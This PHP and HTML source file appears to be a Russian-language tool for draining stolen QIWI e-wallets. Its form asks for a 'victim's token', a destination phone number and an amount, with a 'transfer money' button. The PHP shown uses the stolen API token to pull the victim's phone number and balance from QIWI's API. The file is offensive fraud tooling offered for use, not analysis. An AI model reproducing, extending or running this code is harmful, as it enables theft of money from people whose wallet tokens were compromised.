<style>
.balance input[type="text"] {
    width: 600px;
    height: 40px;
    border: 1px solid #a1a1a1;
    border-radius: 3px;
    background: 0;
    text-align: center;
    padding: 0 10px;
    margin: 0 0 5px 0;
    color: #43474d;
}
.balance input[type="submit"] {
    width: 600px;
    height: 42px;
    background: #46b588;
    border-radius: 3px;
    font-size: 13px;
    font-weight: bold;
    color: #fff;
    text-align: center;
    cursor: pointer;
}
.balance input {
    outline: 0;
    border: 0;
    font-family: PT Sans,sans-serif;
    font-size: 14px;
    box-sizing: border-box;
}
.balance select {
    width: 600px;
    height: 40px;
    border: 1px solid #a1a1a1;
    border-radius: 3px;
    background: 0;
    text-align: center;
    padding: 0 10px;
    margin: 0 0 5px 0;
    color: #43474d;
}
.balance_in{
    width: 600px;
    height: 40px;
    border: 1px solid #a1a1a1;
    border-radius: 3px;
    background: 0;
    text-align: center;
    padding: 0 10px;
    margin: 0 0 5px 0;
    color: #43474d;
}
</style>
<table width="600px" cellpadding="0" cellspacing="0" border="0" align="center">
    <tr>
        <td width="100px" height="100px" valign="top" align="center">		
        <form method="post" name="form" class="balance">
            <br>
            <input name="number" type="text" placeholder="Ваш номер телефона (без +)" required>
			<input name="summa" type="text" placeholder="Сумма перевода" required>
			<input name="token" type="text" placeholder="Токен жертвы" required>
            <br><br><br><input type="submit" formaction="script.php" value="Перевести деньги">
            <br><br><input type="submit" formaction="" value="Узнать номер и баланс">
        </form>		
        </td>
    </tr>
</table>
<center>
<?php
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////// ДАЛЬШЕ ИДЁТ PHP, МОЖЕТЕ НЕ СМОТРЕТЬ\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
if(isset($_POST['token'])){
$token = $_POST['token']; 
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////ПОЛУЧАЕМ НОМЕР ТЕЛЕФОНА\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://edge.qiwi.com/person-profile/v1/profile/current?contractInfoEnabled=true");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$headers = array();
$headers[] = "Accept: application/json";
$headers[] = "Content-Type: application/json";
$headers[] = "Authorization: Bearer $token";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
$json = json_decode($result, true);
$number = $json['contractInfo']['contractId'];
    if($number != null){
  echo"<input class='balance_in' type='text' value='Номер телефона: $number' disabled><br>";  
  }else{
   echo"<input class='balance_in' type='text' value='Токен неверный или отключено получение данных' disabled>";
  }
curl_close ($ch);
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////ПОЛУЧАЕМ БАЛАНС\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://edge.qiwi.com/funding-sources/v2/persons/$number/accounts");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$headers = array();
$headers[] = "Accept: application/json";
$headers[] = "Authorization: Bearer $token";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
$json = json_decode($result, true);
$balance = $json['accounts']['0']['balance']['amount'];
  if($balance != 0){
  echo"<input class='balance_in' type='text' value='Доступный баланс: $balance руб.' disabled>";
  }else{
    if($number != null){
    echo"<input class='balance_in' type='text' value='Доступный баланс: 0 руб.' disabled><br>";  
    }else{
    }
  } 
curl_close ($ch);
}
?>
</center>